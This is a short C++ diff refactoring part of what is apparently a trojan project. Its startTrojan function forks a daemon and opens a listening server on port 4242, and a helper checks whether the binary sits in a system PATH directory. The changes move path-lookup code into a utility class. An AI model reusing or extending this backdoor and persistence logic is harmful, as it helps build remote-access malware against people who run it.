@@ -104,8 +104,6 @@ void Durex::startTrojan()
 			pid_t new_pid = fork();
 			if (new_pid == 0) {
 				this->initDaemonDefault();
-				Service service(this->getCurrentPath());
-				service.initService();
 
 				Server server(4242);
 				server.listenInit();
@@ -122,20 +120,10 @@ void Durex::startTrojan()
 	}
 }
 
-std::string Durex::getCurrentPath()
-{
-    char arg1[20];
-    char exe_path[PATH_MAX + 1] = { 0 };
-
-    sprintf(arg1, "/proc/%d/exe", getpid());
-    readlink(arg1, exe_path, 1024);
-    return std::string(exe_path);
-}
-
 bool Durex::isInSystemBinaryPath()
 {
 	Variable	*var				= this->env->getVariable("PATH");
-	std::string	executablePath		= this->getCurrentPath();
+	std::string	executablePath		= Utils::getCurrentPath();
 	if (var != NULL && var->getVarValue().length() > 0
 		&& executablePath.length() > 0) {
 		std::vector<std::string> content = Utils::split(var->getVarValue(), ':');
